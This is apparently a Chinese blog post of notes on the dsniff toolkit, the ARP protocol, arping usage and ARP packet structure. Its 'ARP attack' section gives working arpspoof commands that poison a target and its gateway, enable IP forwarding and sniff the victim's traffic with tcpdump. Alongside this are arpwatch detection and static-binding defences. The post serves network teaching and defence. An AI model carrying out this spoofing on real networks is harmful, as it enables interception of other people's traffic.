---
title: Linux 嗅探工具 Dsniff
layout: post
comments: true
language: chinese
category: [linux, network]
---


<!-- more -->
















在 CentOS 中，可以直接通过如下命令安装依赖库。

{% highlight text %}
# yum install libdb-devel libpcap-devel libnet-devel openssl-devel
# yum --enablerepo=epel install libnids-devel
{% endhighlight %}

需要注意的时，libnet 使用的是 1.0.X 版本，而非 1.1.X ，两者的 API 是不同的，可以参考 [The Libnet Packet Construction Library](http://packetfactory.openwall.net/projects/libnet/index.html) 。所以，如果安装源的版本比较高，那么只能通过源码进行安装。

## ARP, Address Resolution Protocol

地址解析协议用来根据 IP 地址获取 MAC 地址，主机发送信息时将包含目标 IP 地址的 ARP 请求广播到网络上的所有主机，并接收返回的目标物理地址；在本机中会暂时缓存 ARP 信息，下次请求直接查询缓存。

ARP 协议可以参考 [RFC1027](http://www.ietf.org/rfc/rfc1027.txt)，常见的操作如下。

{% highlight text %}
----- 查看当前的ARP缓存，其中通过ip可以显示当前的状态
$ arp -an
$ ip neigh show

----- 直接通过Shell删除ARP缓存
# arp -n|awk '/^[1-9]/{print "arp -d  " $1}'|sh -x
# ip neigh flush dev eth0

----- 查看ARP老化时间，单位是秒，默认时30s
$ cat /proc/sys/net/ipv4/neigh/eth0/base_reachable_time

----- 查看当前网关的MAC地址
$ arping -I eth0 192.168.1.1

----- 查看当前网段的所有MAC地址
$ nmap -sP 192.168.1.0/24
{% endhighlight %}

tcpdump -i eth0 -ent '(dst 192.168.0.125 and src 192.168.0.141) or (dst 192.168.0.141 and src 192.168.0.125)'

tcpdump arp -n -i wlp3s0


<!--
----- 貌似无法刷新，但是可以将STALE刷新为REACHABLE
arping -I eth0 135.251.196.1 -c 10
arping -b -A -c 10 -I eth0 $ip

Linux实现的ARP缓存老化时间原理解析
-->

arpwatch 实际上就是通过 libpcap 进行监控，也就是根据 arp or rarp 过滤条件接收报文。


driftnet 抓取图片


### ARP 攻击

其中 192.168.3.11 为需要攻击的机器 IP ，192.168.3.1 为网关 IP 。

{% highlight text %}
# arpspoof -i wlp3s0 -t 192.168.3.11 192.168.3.1
{% endhighlight %}

这步是告诉 192.168.3.11 机器，192.168.3.1 的 MAC 地址是我们本机的 MAC 地址。然后，另外打开一个终端，告诉 192.168.3.1，机器 192.168.3.11 的 MAC 地址为本机地址。

{% highlight text %}
# arpspoof -i wlp3s0 -t 192.168.3.1 192.168.3.11
{% endhighlight %}

打开 IP 的转发功能，这样被攻击者 192.168.3.11 的所有报文都会经过本机。

{% highlight text %}
# echo 1 > /proc/sys/net/ipv4/ip_forward
{% endhighlight %}

现在，就可以通过 tcpdump 监控 192.168.3.11 与外部网路的数据报文。

{% highlight text %}
# tcpdump host 192.168.3.11 and not arp
{% endhighlight %}

对于这种中间人攻击，可以通过 arpwatch 进行监控。

{% highlight text %}
# arpwatch -I eth0 -d                        # 监控ARP的变化，并发送邮件
# tailf /var/log/messages | grep arpwatch    # 查看打印到syslog的日志
{% endhighlight %}

arpwatch 会将新增、变更等操作发送到 root 邮箱。

<!--
http://su2.info/doc/arpspoof.php
-->


tcpdump -nn vrrp

Linux防止ARP欺骗攻击

https://www.haiyun.me/tag/arpoison/

linux下防止arp攻击

http://www.linuxsong.org/2010/09/prevent-arp-attack/

普通ARP和免费ARP及arping命令的使用

http://tenderrain.blog.51cto.com/9202912/1650245



### 其它

当使用 arpspoof 时，如果 -i 参数指定的端口不是 eth0，那么就会出现如下的错误：

{% highlight text %}
arpspoof: couldn't arp for host 192.168.3.11
{% endhighlight %}

此时需要修改源码 arp_cache_lookup()@arp.c 中的 strncpy() 函数赋值的设备名称。








Note: 如果出现no route to host;错误，那么可能是由于防火墙导致，可以通过iptables -F清理。

ifconfig eth0:0 192.144.51.73 netmask 255.255.255.0 up
nc -nvvvvkl 2389

另外机器：
nc -nvv 192.144.51.73 2389
IP-MAC绑定
arp -s 123.253.68.209 00:19:56:6F:87:D2 临时增加
echo '192.168.1.1 00:02:B3:38:08:62' > /etc/ip-mac 启动时设置
arp -f /etc/ip-mac
arp(Flags增加M) arp -a (增加PERM标志) 查看是否已经绑定
arp -d IP 删除ARP缓存

tcpdump -nn arp | grep "192.144.51.73"
14:21:30.349933 ARP, Request who-has 192.144.51.73 tell 192.144.51.61, length 28   请求
14:21:30.349949 ARP, Reply 192.144.51.73 is-at 28:6e:d4:88:dd:c2, length 28 相应

0000 ffff ffff ffff 0000 5e00 01ea 0806 0001
0010 0800 06 04 00 01 00 00 5e 00 01 ea 86 4a ea 01
0020 00 00 5e 00 01 ea 86 4a ea 01 0000 00 00 00 00
0030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0040 00 00 00 00

ffff ffff ffff 目的MAC地址，说明前48bit均为1，表示这是一个局域网广播地址；
0000 5e00 01ea 数据包发送的源MAC地址；
08 06表示为数据包类型为arp数据包；
00 01表示这是一个以太网数据包；
08 00表示为IP协议，6是硬件地址长度，4为协议地址长度；
00 01表示是ARP请求报文；
00 00 5e 00 01 ea发送者MAC地址；
86 4a ea 01（转换成十进制是134.74.234.1）是发送者的协议地址（由于协议是IP，所以这是IP地址）；
86 4a ea 01是被请求的协议地址（可以看到请求的地址就是自身的IP地址）；
00 00 5e 00 01 ea是被请求的MAC地址，正常情况下，如果不是免费ARP，这里应该为全0，在响应的时候，由目的主机来填写，但是在免费ARP的请求报文中，这里已经自动填写上自身的MAC地址。

有两种作用：A) 查找某个IP(非本地)对应的MAC地址；B) 宣告要使用IP(本地)，用于告诉整个广播域要使用这个IP，同时可以查看是否IP冲突。



## arping

arping 有两个版本：A) Thomas Habets 写的，可以通过 ```arping <MAC>``` 查看该 MAC 对应的 IP 地址；B) Linux iputils suite 不提供上述功能。

两者的命令行参数有所区别，所以在使用时需要注意，一般 CentOS 是有的是后者，Debian 使用的是前者，可以通过 ```arping -V``` 查看版本。

如下是 CentOS 版本中的常用参数，简单列举如下：

{% highlight text %}
常用参数：
  -f
    第一次响应后立即退出，通常用于确认对应的IP是否存在；
  -c NUM
    指定报文发送的次数；
  -i DEVICE
    如果有多块网卡，指定报文发送的网卡；
  -D
    DAD(Duplicate Address Detection)模式，用于探测IP是否被使用，发送广播报文；
  -U
    UAP(Unsolicited ARP Mode)主动发送ARP请求，用于更新ARP caches；
  -A
    与-U参数相同，不过使用ARP REPLY报文而非ARP REQUEST；
{% endhighlight %}

在使用时，可以通过如下命令查看发送的报文。

{% highlight text %}
# tcpdump -i eth0 -nn arp | grep "192.144.51.73"
{% endhighlight %}

如下是常用示例：

{% highlight text %}
----- 发送广播请求，确认该IP对应的MAC地址，不会更新本地ARP缓存中
arping 192.144.51.52
14:48:54.527346 ARP, Request who-has 192.144.51.52 (28:6e:d4:88:dd:53) tell 192.144.51.85, length 28
14:48:54.527484 ARP, Reply 192.144.51.52 is-at 28:6e:d4:88:dd:53, length 28

----- 发送广播报文，探测该IP是否使用，不会更新本地ARP缓存
arping -D 192.144.51.52
14:56:59.538745 ARP, Request who-has 192.144.51.52 (ff:ff:ff:ff:ff:ff) tell 0.0.0.0, length 28
14:56:59.539401 ARP, Reply 192.144.51.52 is-at 28:6e:d4:88:dd:53, length 28

----- 告知192.144.51.61更新ARP缓存
arping -U -Ieth0 -s192.144.51.73 192.144.51.61
15:08:53.402293 ARP, Request who-has 192.144.51.61 (ff:ff:ff:ff:ff:ff) tell 192.144.51.73, length 28
15:08:54.402451 ARP, Request who-has 192.144.51.61 (28:6e:d4:88:dd:4b) tell 192.144.51.73, length 28
{% endhighlight %}



<!--
普通ARP和免费ARP及arping命令的使用
http://tenderrain.blog.51cto.com/9202912/1650245

Linux防止ARP欺骗攻击
https://www.haiyun.me/tag/arpoison/

linux下防止arp攻击
http://www.linuxsong.org/2010/09/prevent-arp-attack/

Linux和Windows系统绑定网关IP ARP
http://www.haiyun.me/archives/linux-windows-static-arp.html

Linux下用arping和nmap查找arp攻击源
http://www.haiyun.me/archives/arp-arpping-nmap.html

Linux下模拟ARP欺骗代理攻击实验
http://www.haiyun.me/archives/arp-spoof-proxy.html
-->


{% highlight text %}
{% endhighlight %}
